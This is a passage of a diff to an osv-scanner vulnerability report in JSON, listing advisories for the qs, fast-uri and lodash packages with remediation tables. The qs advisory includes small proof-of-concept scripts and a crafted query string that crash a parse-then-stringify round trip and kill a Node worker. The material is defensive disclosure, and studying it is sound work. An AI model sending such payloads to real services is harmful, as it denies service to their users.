Uint8Array]';\n\u003e };\n\u003e ```\n\u003e \n\u003e If duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | qs | 6.15.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | qs | 6.15.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-4mjr-xmp4-gh2g | qs | 6.16.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82417\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82417\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-82417](https://osv.dev/CVE-2026-82417)**.\n\n## [GHSA-4mjr-xmp4-gh2g](https://osv.dev/GHSA-4mjr-xmp4-gh2g)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\u003e \n\u003e An attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\u003e \n\u003e ### Details\n\u003e `utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\u003e \n\u003e ```js\n\u003e if (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n\u003e ```\n\u003e \n\u003e `utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\u003e \n\u003e ```js\n\u003e var isBuffer = function isBuffer(obj) {\n\u003e     if (!obj || typeof obj !== 'object') { return false; }\n\u003e     return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n\u003e };\n\u003e ```\n\u003e \n\u003e `constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\u003e \n\u003e \n\u003e ### Trust Boundary Note\n\u003e \n\u003e `qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\u003e \n\u003e \n\u003e ### PoC\n\u003e `poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e \n\u003e var untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\u003e \n\u003e var parsed = qs.parse(untrustedQueryString, { plainObjects: true });\n\u003e console.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\u003e \n\u003e try {\n\u003e     qs.stringify(parsed);\n\u003e     console.log('[stringify] no throw (unexpected)');\n\u003e } catch (e) {\n\u003e     console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n\u003e }\n\u003e ```\n\u003e \n\u003e `poc02_isBuffer.js` — the minimal defect:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e try {\n\u003e     qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n\u003e } catch (e) {\n\u003e     console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n\u003e }\n\u003e ```\n\u003e \n\u003e `poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e \n\u003e function handleRequestAsync(clientJsonBody) {\n\u003e     try {\n\u003e         setImmediate(function () {                 // async continuation, outside the try\n\u003e             qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n\u003e         });\n\u003e         console.log('[handler] returned 200 synchronously; async work scheduled');\n\u003e     } catch (e) {\n\u003e         console.log('[handler] caught synchronously (will NOT happen):', e.message);\n\u003e     }\n\u003e }\n\u003e process.on('exit', function (code) {\n\u003e     console.log('[proc] process exiting with code:', code);\n\u003e });\n\u003e handleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n\u003e ```\n\u003e \n\u003e ### Execution Steps\n\u003e \n\u003e ```bash\n\u003e cd poc\n\u003e npm install qs@6.15.3\n\u003e node poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\n\u003e node poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\n\u003e node poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n\u003e ```\n\u003e \n\u003e ### Reproduction Evidence\n\u003e \n\u003e `poc02c_isBuffer_qs_only_roundtrip.js` :\n\u003e \n\u003e ```\n\u003e [parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n\u003e [stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e ```\n\u003e \n\u003e `poc02_isBuffer.js`:\n\u003e \n\u003e ```\n\u003e [A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e ```\n\u003e \n\u003e `poc02b_isBuffer_async_crash.js` :\n\u003e \n\u003e ```\n\u003e [handler] returned 200 synchronously; async work scheduled\n\u003e [proc] process exiting with code: 1\n\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e     at Object.isBuffer (.../qs/lib/utils.js:332:78)\n\u003e     at stringify (.../qs/lib/stringify.js:127:45)\n\u003e === EXIT CODE: 1 ===\n\u003e ```\n\u003e \n\u003e The pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\u003e \n\u003e ### Recommended Fix\n\u003e \n\u003e Replace the duck-type with a brand check mirroring `utils.isRegExp`:\n\u003e \n\u003e ```js\n\u003e var isBuffer = function isBuffer(obj) {\n\u003e     if (!obj || typeof obj !== 'object') { return false; }\n\u003e     if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n\u003e         return Buffer.isBuffer(obj);\n\u003e     }\n\u003e     return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n\u003e };\n\u003e ```\n\u003e \n\u003e If duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | qs | 6.15.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | qs | 6.15.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-4mjr-xmp4-gh2g | qs | 6.16.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82417\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82417\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-82417",
+              "name": "CVE-2026-82417",
+              "properties": {
+                "security-severity": "6.3"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-82417: qs: Denial of Service via Attacker Controlled isBuffer",
+                "text": "CVE-2026-82417: qs: Denial of Service via Attacker Controlled isBuffer"
+              }
+            },
+            {
+              "deprecatedIds": [
                 "CVE-2026-4539",
                 "PYSEC-2026-2987",
                 "GHSA-5239-wwwm-4pmq"
@@ -6504,6 +6960,30 @@
               "shortDescription": {
                 "markdown": "GHSA-5c6j-r48x-rmvq: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
                 "text": "GHSA-5c6j-r48x-rmvq: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "CVE-2026-75931",
+                "GHSA-5jgf-p345-68v8"
+              ],
+              "fullDescription": {
+                "markdown": "### Impact\n\n`fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\n### Workarounds\n\nResolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check.",
+                "text": "### Impact\n\n`fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\n### Workarounds\n\nResolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-75931](https://osv.dev/CVE-2026-75931)**.\n\n## [GHSA-5jgf-p345-68v8](https://osv.dev/GHSA-5jgf-p345-68v8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Resolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5jgf-p345-68v8 | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75931\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75931\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-75931](https://osv.dev/CVE-2026-75931)**.\n\n## [GHSA-5jgf-p345-68v8](https://osv.dev/GHSA-5jgf-p345-68v8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Resolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5jgf-p345-68v8 | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75931\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75931\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-75931",
+              "name": "CVE-2026-75931",
+              "properties": {
+                "security-severity": "7.5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-75931: fast-uri vulnerable to host confusion via skipped IDN canonicalization on scheme-relative references",
+                "text": "CVE-2026-75931: fast-uri vulnerable to host confusion via skipped IDN canonicalization on scheme-relative references"
               }
             },
             {
@@ -7154,8 +7634,8 @@
                 "text": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version."
               },
               "help": {
-                "markdown": "**Your dependency is vulnerable to [CVE-2025-13465](https://osv.dev/CVE-2025-13465)**\n(Also published as: [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh), [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg), ).\n\n## [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\u003e \n\u003e The issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched in 4.18.0.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n## [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\u003e \n\u003e The issue permits deletion of properties but does not allow overwriting their original behavior.  \n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched on 4.17.23.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | lodash | 4.17.21 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f23m-r3pf-42rh | lodash | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-es | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-amd | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash.unset | 4.18.0 |\n| GHSA-xxjr-mmjv-4gpg | lodash | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-es | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-amd | 4.17.23 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2025-13465\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
-                "text": "**Your dependency is vulnerable to [CVE-2025-13465](https://osv.dev/CVE-2025-13465)**\n(Also published as: [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh), [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg), ).\n\n## [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\u003e \n\u003e The issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched in 4.18.0.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n## [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\u003e \n\u003e The issue permits deletion of properties but does not allow overwriting their original behavior.  \n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched on 4.17.23.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | lodash | 4.17.21 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f23m-r3pf-42rh | lodash | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-es | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-amd | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash.unset | 4.18.0 |\n| GHSA-xxjr-mmjv-4gpg | lodash | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-es | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-amd | 4.17.23 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2025-13465\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+                "markdown": "**Your dependency is vulnerable to [CVE-2025-13465](https://osv.dev/CVE-2025-13465)**\n(Also published as: [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh), [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg), ).\n\n## [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\u003e \n\u003e The issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched in 4.18.0.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n## [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\u003e \n\u003e The issue permits deletion of properties but does not allow overwriting their original behavior.  \n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched on 4.17.23.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | lodash | 4.17.21 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f23m-r3pf-42rh | lodash-amd | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash.unset | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-es | 4.18.0 |\n| GHSA-xxjr-mmjv-4gpg | lodash-amd | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-es | 4.17.23 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2025-13465\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2025-13465](https://osv.dev/CVE-2025-13465)**\n(Also published as: [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh), [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg), ).\n\n## [GHSA-f23m-r3pf-42rh](https://osv.dev/GHSA-f23m-r3pf-42rh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\u003e \n\u003e The issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched in 4.18.0.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n## [GHSA-xxjr-mmjv-4gpg](https://osv.dev/GHSA-xxjr-mmjv-4gpg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\u003e \n\u003e The issue permits deletion of properties but does not allow overwriting their original behavior.  \n\u003e \n\u003e ### Patches\n\u003e \n\u003e This issue is patched on 4.17.23.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | lodash | 4.17.21 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f23m-r3pf-42rh | lodash-amd | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash.unset | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash | 4.18.0 |\n| GHSA-f23m-r3pf-42rh | lodash-es | 4.18.0 |\n| 